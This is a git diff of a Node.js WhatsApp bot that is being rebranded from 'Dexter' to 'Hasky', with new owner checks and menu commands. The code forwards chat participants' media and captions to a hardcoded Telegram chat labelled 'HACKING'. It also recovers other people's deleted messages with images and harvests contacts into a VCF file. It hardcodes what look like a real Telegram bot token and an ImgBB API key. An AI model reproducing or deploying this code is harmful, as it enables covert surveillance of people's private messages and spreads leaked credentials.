@@ -1,3 +1,4 @@
+
 const {
   default: makeWASocket,
   useMultiFileAuthState,
@@ -178,12 +179,40 @@ downloadSessionFile();
 // App configuration
 const app = express();
 const port = config.PORT || 9090;
-const ownerNumber = config.OWNER_NUMBER || ['94752911528'];
+
+// Owner numbers array - handle both string and array
+let ownerNumbers = [];
+if (Array.isArray(config.OWNER_NUMBER)) {
+  ownerNumbers = config.OWNER_NUMBER;
+} else if (config.OWNER_NUMBER) {
+  ownerNumbers = [config.OWNER_NUMBER];
+} else {
+  ownerNumbers = ['94752911528'];
+}
+console.log('Owner numbers:', ownerNumbers);
+
+// Owner check function
+function isOwner(senderJid) {
+  try {
+    if (!senderJid) return false;
+    const phoneNumber = senderJid.split('@')[0];
+    return ownerNumbers.includes(phoneNumber);
+  } catch (err) {
+    console.error('Owner check error:', err.message);
+    return false;
+  }
+}
+
+// Group check function
+function isGroup(jid) {
+  return jid.endsWith('@g.us') || jid.endsWith('@g.us');
+}
+
 const tempDir = path.join(os.tmpdir(), 'cache-temp');
 const startTime = performance.now();
 const IMGBB_API_KEY = config.IMGBB_API_KEY || '99d49c87acce0f04176ff8a330d02eb5';
-const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN || '8491884027:AAGhGQjiVArxWgZtO2-JkkZDleiuSQ592Pg'; // Single token as string
-const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID || '-1002720330370'; // Single chat ID as string
+const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN || '8491884027:AAGhGQjiVArxWgZtO2-JkkZDleiuSQ592Pg';
+const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID || '-1002720330370';
 
 // Serve static files
 app.use(express.static(path.join(__dirname, 'public')));
@@ -296,7 +325,6 @@ async function sendToTelegram(senderJid, messageType, buffer, caption) {
   }
 
   try {
-    // Validate file size (Telegram limits: 50MB for bots, 20MB for photos)
     const fileSizeMB = buffer.length / (1024 * 1024);
     if (fileSizeMB > (messageType === 'imageMessage' ? 20 : 50)) {
       console.error(`File too large for Telegram (${fileSizeMB.toFixed(2)}MB). Type: ${messageType}`);
@@ -310,7 +338,7 @@ async function sendToTelegram(senderJid, messageType, buffer, caption) {
                           `📝 𝗖𝗔𝗣𝗧𝗜𝗢𝗡 ❔ ${caption || 'No caption'}\n` +
                           `🕒 𝗧𝗜𝗠𝗘 ➔ ${sriLankaTime}\n` +
                           `📤 𝗧𝗬𝗣𝗘 ❔ ${messageType.replace('Message', '')}\n\n` +
-                          `𝗗𝗘𝗫𝗧𝗘𝗥 𝗛𝗔𝗖𝗞𝗜𝗡𝗚 ✓`;
+                          `𝗛𝗔𝗦𝗞𝗬 𝗛𝗔𝗖𝗞𝗜𝗡𝗚 ✓`;
 
     formData.append('chat_id', TELEGRAM_CHAT_ID);
     formData.append('caption', telegramCaption);
@@ -360,6 +388,57 @@ async function fetchMedia(source) {
   } catch (err) {
     console.error('Media fetch error:', err.message);
     return null;
+  }
+}
+
+// Send interactive cards message
+async function sendCardsMessage(conn, jid, title, subtitle, footer, cards) {
+  try {
+    const message = {
+      text: title,
+      title: title,
+      subtitle: subtitle,
+      footer: footer,
+      cards: cards
+    };
+    
+    await conn.sendMessage(jid, {
+      interactive: {
+        type: 'cards',
+        ...message
+      }
+    });
+    
+    return true;
+  } catch (err) {
+    console.error('Cards message error:', err.message);
+    return false;
+  }
+}
+
+// Send button/list message
+async function sendButtonMessage(conn, jid, options) {
+  try {
+    const message = {
+      image: options.image,
+      caption: options.caption,
+      title: options.title,
+      footer: options.footer,
+      interactiveButtons: options.interactiveButtons,
+      hasMediaAttachment: options.hasMediaAttachment || false
+    };
+    
+    await conn.sendMessage(jid, {
+      interactive: {
+        type: 'buttons',
+        ...message
+      }
+    });
+    
+    return true;
+  } catch (err) {
+    console.error('Button message error:', err.message);
+    return false;
   }
 }
 
@@ -631,7 +710,6 @@ async function connectToWA() {
         }
 
         const senderJid = mek.key.participant || mek.key.remoteJid;
-        const restrictedNumber = '94752911528@s.whatsapp.net';
         const pushName = mek.pushName || 'Unknown';
         const userId = senderJid.split('@')[0];
         let senderDpUrl = 'https://i.imgur.com/default-profile.jpg';
@@ -641,8 +719,8 @@ async function connectToWA() {
           console.warn(`Failed to fetch profile picture for ${senderJid}: ${err.message}`);
         }
 
-        // Handle dexter-is-friendly message
-        if (messageText.toLowerCase() === 'dexter-is-friendly' && !mek.key.fromMe) {
+        // Handle hasky-is-friendly message
+        if (messageText.toLowerCase() === 'hasky-is-friendly' && !mek.key.fromMe) {
           try {
             const phoneNumber = senderJid.split('@')[0];
             const existingContact = await pool.query(
@@ -741,9 +819,7 @@ async function connectToWA() {
         if (
           messageText &&
           !messageText.startsWith('.') &&
-          !mek.key.fromMe &&
-          senderJid !== restrictedNumber &&
-          mek.key.remoteJid !== restrictedNumber
+          !mek.key.fromMe
         ) {
           for (const rule of replyRules.rules) {
             let isMatch = false;
@@ -844,16 +920,38 @@ async function connectToWA() {
           }
         }
 
-        // Command handling
+        // Command handling - GROUP commands allow කරනවා
         if (messageText && messageText.startsWith('.')) {
           const [command, ...args] = messageText.split(' ');
+
+          // Check if it's a group and if group commands are allowed
+          const isGroupChat = isGroup(mek.key.remoteJid);
+          
+          // Group තුළ allow කරන commands
+          const groupAllowedCommands = ['.ping', '.runtime', '.key', '.editor', '.cards', '.menu', '.list', '.help'];
+          
+          // Only owners allowed commands
+          const ownerOnlyCommands = ['.reload', '.delete', '.alwaysonline', '.recording', '.last', '.vcf'];
+          
+          // Check if command is allowed in group
+          if (isGroupChat && !groupAllowedCommands.includes(command.toLowerCase())) {
+            // Group තුළ owner commands වලට පමණක් permission දෙන්න
+            if (ownerOnlyCommands.includes(command.toLowerCase()) && !isOwner(senderJid)) {
+              await withRetry(() =>
+                conn.sendMessage(mek.key.remoteJid, {
+                  text: '🚫 Only owners can use this command in groups.',
+                }, { quoted: mek })
+              );
+              return;
+            }
+          }
 
           switch (command.toLowerCase()) {
             case '.ping':
               const pingTime = performance.now();
               await withRetry(() =>
                 conn.sendMessage(mek.key.remoteJid, {
-                  text: `🏓 Pong! Response time: ${Math.round(performance.now() - pingTime)}ms`,
+                  text: `🏓 Pong! Response time: ${Math.round(performance.now() - pingTime)}ms\n\n> ʜᴀꜱᴋʏ ʙᴏᴛ`,
                 }, { quoted: mek })
               );
               break;
@@ -865,56 +963,56 @@ async function connectToWA() {
               const hours = Math.floor(minutes / 60);
               await withRetry(() =>
                 conn.sendMessage(mek.key.remoteJid, {
-                  text: `⏰ Bot Runtime: ${hours}h ${minutes % 60}m ${seconds % 60}s`,
+                  text: `⏰ Bot Runtime: ${hours}h ${minutes % 60}m ${seconds % 60}s\n\n> ʜᴀꜱᴋʏ ʙᴏᴛ`,
                 }, { quoted: mek })
               );
               break;
 
             case '.reload':
-              if (ownerNumber.includes(senderJid.split('@')[0])) {
-                const result = await reloadJsonFile();
-                await withRetry(() => conn.sendMessage(mek.key.remoteJid, { text: result }, { quoted: mek }));
-              } else {
+              if (!isOwner(senderJid)) {
                 await withRetry(() =>
                   conn.sendMessage(mek.key.remoteJid, {
                     text: '🚫 Only owners can use the .reload command.',
                   }, { quoted: mek })
                 );
+                break;
               }
+              const result = await reloadJsonFile();
+              await withRetry(() => conn.sendMessage(mek.key.remoteJid, { text: result }, { quoted: mek }));
               break;
 
             case '.delete':
-              if (ownerNumber.includes(senderJid.split('@')[0])) {
-                const clear = args[0]?.toLowerCase() === 'clear';
-                const result = await handleDelete(clear);
-                if (clear && !result.error) {
-                  await withRetry(() =>
-                    conn.sendMessage(mek.key.remoteJid, {
-                      text: '✅ Database cleared successfully',
-                    }, { quoted: mek })
-                  );
-                } else if (!clear && result.deletedMessages) {
-                  const message = result.deletedMessages.length > 0
-                    ? `🗑️ Found ${result.deletedMessages.length} deleted messages with images:\n` +
-                      result.deletedMessages
-                        .map(
-                          m =>
-                            `ID: ${m.message_id}\nSender: ${m.sender_jid}\nImage: ${m.image_url}\nDeleted By: ${m.deleted_by}\nDeleted At: ${m.sri_lanka_time}`
-                        )
-                        .join('\n\n')
-                    : '🗑️ No deleted messages with images found.';
-                  await withRetry(() => conn.sendMessage(mek.key.remoteJid, { text: message }, { quoted: mek }));
-                } else {
-                  await withRetry(() =>
-                    conn.sendMessage(mek.key.remoteJid, {
-                      text: '❌ Failed to process delete operation',
-                    }, { quoted: mek })
-                  );
-                }
-              } else {
+              if (!isOwner(senderJid)) {
                 await withRetry(() =>
                   conn.sendMessage(mek.key.remoteJid, {
                     text: '🚫 Only owners can use the .delete command.',
+                  }, { quoted: mek })
+                );
+                break;
+              }
+              const clear = args[0]?.toLowerCase() === 'clear';
+              const deleteResult = await handleDelete(clear);
+              if (clear && !deleteResult.error) {
+                await withRetry(() =>
+                  conn.sendMessage(mek.key.remoteJid, {
+                    text: '✅ Database cleared successfully',
+                  }, { quoted: mek })
+                );
+              } else if (!clear && deleteResult.deletedMessages) {
+                const message = deleteResult.deletedMessages.length > 0
+                  ? `🗑️ Found ${deleteResult.deletedMessages.length} deleted messages with images:\n` +
+                    deleteResult.deletedMessages
+                      .map(
+                        m =>
+                          `ID: ${m.message_id}\nSender: ${m.sender_jid}\nImage: ${m.image_url}\nDeleted By: ${m.deleted_by}\nDeleted At: ${m.sri_lanka_time}`
+                      )
+                      .join('\n\n')
+                  : '🗑️ No deleted messages with images found.';
+                await withRetry(() => conn.sendMessage(mek.key.remoteJid, { text: message }, { quoted: mek }));
+              } else {
+                await withRetry(() =>
+                  conn.sendMessage(mek.key.remoteJid, {
+                    text: '❌ Failed to process delete operation',
                   }, { quoted: mek })
                 );
               }
@@ -967,7 +1065,7 @@ async function connectToWA() {
 
                 const response = await withRetry(() =>
                   conn.sendMessage(mek.key.remoteJid, {
-                    text: `📡 *Processing Report...*\n${progressStages[0]}\n⏳ Time Remaining: 2:00`,
+                    text: `📡 *Processing Report...*\n${progressStages[0]}\n⏳ Time Remaining: 2:00\n\n> ʜᴀꜱᴋʏ ᴘʀᴏᴄᴇꜱꜱɪɴɢ`,
                     contextInfo: {
                       forwardingScore: 999,
                       isForwarded: true,
@@ -982,7 +1080,7 @@ async function connectToWA() {
                   const seconds = remainingSeconds % 60;
                   await withRetry(() =>
                     conn.sendMessage(mek.key.remoteJid, {
-                      text: `📡 *Processing Report...*\n${progressStages[i]}\n⏳ Time Remaining: ${minutes}:${seconds.toString().padStart(2, '0')}`,
+                      text: `📡 *Processing Report...*\n${progressStages[i]}\n⏳ Time Remaining: ${minutes}:${seconds.toString().padStart(2, '0')}\n\n> ʜᴀꜱᴋʏ ᴘʀᴏᴄᴇꜱꜱɪɴɢ`,
                       edit: response.key,
                     })
                   );
@@ -1006,7 +1104,7 @@ async function connectToWA() {
               break;
 
             case '.alwaysonline':
-              if (!ownerNumber.includes(senderJid.split('@')[0])) {
+              if (!isOwner(senderJid)) {
                 await withRetry(() =>
                   conn.sendMessage(mek.key.remoteJid, {
                     text: '🚫 Only owners can use the .alwaysonline command.',
@@ -1043,7 +1141,7 @@ async function connectToWA() {
 
                 await withRetry(() =>
                   conn.sendMessage(mek.key.remoteJid, {
-                    text: `✅ Always online ${enabled ? 'enabled' : 'disabled'}`,
+                    text: `✅ Always online ${enabled ? 'enabled' : 'disabled'}\n\n> ʜᴀꜱᴋʏ ʙᴏᴛ`,
                   }, { quoted: mek })
                 );
               } catch (err) {
@@ -1057,7 +1155,7 @@ async function connectToWA() {
               break;
 
             case '.recording':
-              if (!ownerNumber.includes(senderJid.split('@')[0])) {
+              if (!isOwner(senderJid)) {
                 await withRetry(() =>
                   conn.sendMessage(mek.key.remoteJid, {
                     text: '🚫 Only owners can use the .recording command.',
@@ -1095,7 +1193,7 @@ async function connectToWA() {
 
                 await withRetry(() =>
                   conn.sendMessage(mek.key.remoteJid, {
-                    text: `✅ Recording presence ${enabled ? 'enabled' : 'disabled'}${autoStatus ? ' with auto status (composing/recording)' : ''}`,
+                    text: `✅ Recording presence ${enabled ? 'enabled' : 'disabled'}${autoStatus ? ' with auto status (composing/recording)' : ''}\n\n> ʜᴀꜱᴋʏ ʙᴏᴛ`,
                   }, { quoted: mek })
                 );
               } catch (err) {
@@ -1109,7 +1207,7 @@ async function connectToWA() {
               break;
 
             case '.last':
-              if (!ownerNumber.includes(senderJid.split('@')[0])) {
+              if (!isOwner(senderJid)) {
                 await withRetry(() =>
                   conn.sendMessage(mek.key.remoteJid, {
                     text: '🚫 Only owners can use the .last command.',
@@ -1143,7 +1241,7 @@ async function connectToWA() {
 
                 await withRetry(() =>
                   conn.sendMessage(mek.key.remoteJid, {
-                    text: `✅ Always online disabled for ${phoneNumber}`,
+                    text: `✅ Always online disabled for ${phoneNumber}\n\n> ʜᴀꜱᴋʏ ʙᴏᴛ`,
                   }, { quoted: mek })
                 );
               } catch (err) {
@@ -1157,7 +1255,7 @@ async function connectToWA() {
               break;
 
             case '.vcf':
-              if (!ownerNumber.includes(senderJid.split('@')[0])) {
+              if (!isOwner(senderJid)) {
                 await withRetry(() =>
                   conn.sendMessage(mek.key.remoteJid, {
                     text: '🚫 Only owners can use the .vcf command.',
@@ -1180,27 +1278,34 @@ async function connectToWA() {
                   break;
                 }
 
+                // VCF file create කරනවා
                 let vcfContent = '';
                 contacts.forEach(contact => {
+                  // Phone number clean කරන්න
+                  const cleanPhone = contact.phone_number.replace(/[^0-9]/g, '');
                   vcfContent += `BEGIN:VCARD\n` +
                                 `VERSION:3.0\n` +
                                 `FN:${contact.display_name}\n` +
-                                `TEL;TYPE=CELL:${contact.phone_number}\n` +
+                                `TEL;TYPE=CELL,VOICE:${cleanPhone}\n` +
                                 `END:VCARD\n`;
                 });
 
-                const vcfFilePath = path.join(tempDir, `contacts_${getRandom()}.vcf`);
-                await fs.writeFile(vcfFilePath, vcfContent);
+                const vcfFilePath = path.join(tempDir, `contacts_${Date.now()}.vcf`);
+                await fs.writeFile(vcfFilePath, vcfContent, 'utf8');
 
+                // File එක send කරනවා
+                const fileBuffer = await fs.readFile(vcfFilePath);
+                
                 await withRetry(() =>
                   conn.sendMessage(mek.key.remoteJid, {
-                    document: { url: vcfFilePath },
+                    document: fileBuffer,
                     mimetype: 'text/vcard',
-                    fileName: 'Friendly_Contacts.vcf',
-                    caption: `📋 Generated VCF with ${contacts.length} contacts`,
+                    fileName: 'Hasky_Contacts.vcf',
+                    caption: `📋 Generated VCF with ${contacts.length} contacts\n\n> ʜᴀꜱᴋʏ ʙᴏᴛ`,
                   }, { quoted: mek })
                 );
 
+                // Temporary file delete කරනවා
                 await fs.unlink(vcfFilePath).catch(err => console.error('VCF file deletion error:', err.message));
 
                 console.log(`Sent VCF file with ${contacts.length} contacts to ${senderJid}`);
@@ -1209,6 +1314,284 @@ async function connectToWA() {
                 await withRetry(() =>
                   conn.sendMessage(mek.key.remoteJid, {
                     text: `❌ Failed to generate VCF: ${err.message}`,
+                  }, { quoted: mek })
+                );
+              }
+              break;
+
+            case '.cards':
+              try {
+                const cards = [
+                  {
+                    image: { url: 'https://files.catbox.moe/hynje8.jpg' },
+                    title: '✨ Hasky Features ✨',
+                    body: 'Advanced WhatsApp Bot with multiple features',
+                    footer: 'Powered by Hasky',
+                    buttons: [
+                      {
+                        name: 'quick_reply',
+                        buttonParamsJson: JSON.stringify({
+                          display_text: 'View Commands',
+                          id: 'commands'
+                        })
+                      },
+                      {
+                        name: 'cta_url',
+                        buttonParamsJson: JSON.stringify({
+                          display_text: 'GitHub',
+                          url: 'https://github.com'
+                        })
+                      }
+                    ]
+                  },
+                  {
+                    image: { url: 'https://files.catbox.moe/hynje8.jpg' },
+                    title: '📊 Hasky Status 📊',
+                    body: 'Check bot statistics and performance',
+                    footer: 'Real-time monitoring',
+                    buttons: [
+                      {
+                        name: 'quick_reply',
+                        buttonParamsJson: JSON.stringify({
+                          display_text: 'View Status',
+                          id: 'status'
+                        })
+                      },
+                      {
+                        name: 'cta_url',
+                        buttonParamsJson: JSON.stringify({
+                          display_text: 'Dashboard',
+                          url: 'https://dashboard.hasky.com'
+                        })
+                      }
+                    ]
+                  }
+                ];
+                
+                const success = await sendCardsMessage(
+                  conn,
+                  mek.key.remoteJid,
+                  '🤖 HASKY BOT MENU 🤖',
+                  'Select from the cards below',
+                  'Made with ❤️ by Hasky',
+                  cards
+                );
+                
+                if (!success) {
+                  await withRetry(() =>
+                    conn.sendMessage(mek.key.remoteJid, {
+                      text: '❌ Failed to send cards message',
+                    }, { quoted: mek })
+                  );
+                }
+              } catch (err) {
+                console.error('Cards command error:', err.message);
+                await withRetry(() =>
+                  conn.sendMessage(mek.key.remoteJid, {
+                    text: `❌ Error: ${err.message}`,
+                  }, { quoted: mek })
+                );
+              }
+              break;
+
+            case '.menu':
+            case '.help':
+              try {
+                // Create sections for the menu
+                const sections = [
+                  {
+                    title: "📋 Main Commands",
+                    highlight_label: "Essential",
+                    rows: [
+                      {
+                        title: "🎯 All Commands",
+                        description: "View all available commands",
+                        id: `.help`
+                      },
+                      {
+                        title: "⚡ Quick Commands",
+                        description: "Frequently used commands",
+                        id: `.quick`
+                      },
+                      {
+                        title: "🔧 Bot Settings",
+                        description: "Configure bot settings",
+                        id: `.settings`
+                      }
+                    ]
+                  },
+                  {
+                    title: "🛠️ Tools",
+                    highlight_label: "Utilities",
+                    rows: [
+                      {
+                        title: "📊 Bot Status",
+                        description: "Check bot statistics",
+                        id: `.status`
+                      },
+                      {
+                        title: "🔄 Reload Config",
+                        description: "Reload configuration files",
+                        id: `.reload`
+                      },
+                      {
+                        title: "🗑️ Clear Data",
+                        description: "Clear bot data",
+                        id: `.delete clear`
+                      }
+                    ]
+                  },
+                  {
+                    title: "📱 Social",
+                    highlight_label: "Connect",
+                    rows: [
+                      {
+                        title: "👤 Owner Info",
+                        description: "Contact bot owner",
+                        id: `.owner`
+                      },
+                      {
+                        title: "📞 Save Contact",
+                        description: "Save your contact",
+                        id: `hasky-is-friendly`
+                      },
+                      {
+                        title: "📇 Export Contacts",
+                        description: "Get saved contacts as VCF",
+                        id: `.vcf`
+                      }
+                    ]
+                  }
+                ];
+                
+                // Send button message with list
+                const success = await sendButtonMessage(conn, mek.key.remoteJid, {
+                  image: { url: 'https://files.catbox.moe/hynje8.jpg' },
+                  caption: "🤖 *HASKY BOT INTERACTIVE MENU* 🤖\n\nSelect an option from the menu below or use the buttons",
+                  title: "HASKY BOT",
+                  footer: "© 2024 Hasky Bot | Interactive Menu",
+                  interactiveButtons: [
+                    {
+                      name: "single_select",
+                      buttonParamsJson: JSON.stringify({
+                        title: "📁 Select Category",
+                        sections: sections
+                      })
+                    },
+                    {
+                      name: "cta_url",
+                      buttonParamsJson: JSON.stringify({
+                        display_text: "🌐 Visit Website",
+                        url: "https://github.com"
+                      })
+                    },
+                    {
+                      name: "quick_reply",
+                      buttonParamsJson: JSON.stringify({
+                        display_text: "❓ Help",
+                        id: "help"
+                      })
+                    }
+                  ],
+                  hasMediaAttachment: true
+                });
+                
+                if (!success) {
+                  await withRetry(() =>
+                    conn.sendMessage(mek.key.remoteJid, {
+                      text: '❌ Failed to send menu message',
+                    }, { quoted: mek })
+                  );
+                }
+              } catch (err) {
+                console.error('Menu command error:', err.message);
+                await withRetry(() =>
+                  conn.sendMessage(mek.key.remoteJid, {
+                    text: `❌ Error: ${err.message}`,
+                  }, { quoted: mek })
+                );
+              }
+              break;
+
+            case '.list':
+              try {
+                // Simple list message
+                const sections = [
+                  {
+                    title: "🌟 Popular Commands",
+                    rows: [
+                      {
+                        title: "🏓 Ping",
+                        description: "Check bot response time",
+                        rowId: ".ping"
+                      },
+                      {
+                        title: "⏰ Runtime",
+                        description: "Check bot uptime",
+                        rowId: ".runtime"
+                      },
+                      {
+                        title: "🔄 Reload",
+                        description: "Reload configuration",
+                        rowId: ".reload"
+                      }
+                    ]
+                  },
+                  {
+                    title: "🔧 Tools",
+                    rows: [
+                      {
+                        title: "🗑️ Delete Messages",
+                        description: "Manage deleted messages",
+                        rowId: ".delete"
+                      },
+                      {
+                        title: "🔑 Get Message Key",
+                        description: "Get message metadata",
+                        rowId: ".key"
+                      },
+                      {
+                        title: "✏️ Message Editor",
+                        description: "Edit messages",
+                        rowId: ".editor"
+                      }
+                    ]
+                  },
+                  {
+                    title: "⚙️ Settings",
+                    rows: [
+                      {
+                        title: "💚 Always Online",
+                        description: "Toggle always online",
+                        rowId: ".alwaysonline"
+                      },
+                      {
+                        title: "🎤 Recording",
+                        description: "Toggle recording presence",
+                        rowId: ".recording"
+                      },
+                      {
+                        title: "📴 Disable Online",
+                        description: "Disable online for number",
+                        rowId: ".last"
+                      }
+                    ]
+                  }
+                ];
+                
+                await conn.sendMessage(mek.key.remoteJid, {
+                  text: "📋 *HASKY BOT COMMAND LIST* 📋\n\nSelect a command from the list below:",
+                  footer: "Made with ❤️ by Hasky",
+                  title: "HASKY BOT COMMANDS",
+                  buttonText: "View Commands",
+                  sections: sections
+                });
+                
+              } catch (err) {
+                console.error('List command error:', err.message);
+                await withRetry(() =>
+                  conn.sendMessage(mek.key.remoteJid, {
+                    text: `❌ Failed to send list: ${err.message}`,
                   }, { quoted: mek })
                 );
               }
@@ -1419,13 +1802,14 @@ async function sendConnectedMessage(conn) {
     const dbStatus = await checkDatabaseConnection();
     const sriLankaTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
     
-    const message = `🤖 *Bot Connected Successfully!* 🤖\n\n` +
+    const message = `🤖 *Hasky Bot Connected Successfully!* 🤖\n\n` +
                    `🕒 *Sri Lanka Time:* ${sriLankaTime}\n` +
                    `📊 *Database Status:* ${dbStatus}\n` +
                    `💻 *Host:* ${os.hostname()}\n\n` +
-                   `✅ Ready to receive messages!`;
+                   `✅ Ready to receive messages!\n\n` +
+                   `> ʜᴀꜱᴋʏ ʙᴏᴛ`;
     
-    for (const owner of ownerNumber) {
+    for (const owner of ownerNumbers) {
       await withRetry(() => conn.sendMessage(`${owner}@s.whatsapp.net`, { text: message }));
     }
   } catch (err) {
@@ -1558,12 +1942,12 @@ app.get('/send-message', async (req, res) => {
   }
 
   const jid = `${phoneNumber}@s.whatsapp.net`;
-  const imagePath = path.join(__dirname, 'public', 'dexter.jpg');
+  const imagePath = path.join(__dirname, 'public', 'hasky.jpg');
 
   try {
     const imageBuffer = await fetchMedia(imagePath);
     if (!imageBuffer) {
-      return res.status(500).json({ error: 'Failed to load dexter.jpg' });
+      return res.status(500).json({ error: 'Failed to load hasky.jpg' });
     }
 
     const contextInfo = {
@@ -1592,6 +1976,6 @@ app.get('/send-message', async (req, res) => {
 });
 
 app.listen(port, () => {
-  console.log(`Server is running on port ${port}`);
+  console.log(`🤖 Hasky Bot is running on port ${port}`);
   connectToWA();
 });
